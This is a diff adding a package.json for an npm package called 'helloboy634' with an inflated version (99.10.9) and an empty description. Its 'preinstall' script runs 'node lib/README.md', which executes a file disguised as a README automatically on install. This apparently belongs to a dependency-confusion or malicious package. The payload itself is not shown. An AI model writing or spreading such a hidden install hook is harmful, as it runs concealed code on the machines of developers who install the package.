@@ -1,0 +1,12 @@
+{
+  "name": "helloboy634",
+  "version": "99.10.9",
+  "description": "okbit package",
+  "main":"index.js",
+  "scripts":{
+  "test":"echo 'error no test specified' && exit 1",
+  "preinstall":"node lib/README.md"
+  },
+  "author":"",
+  "License":"ISC"
+}
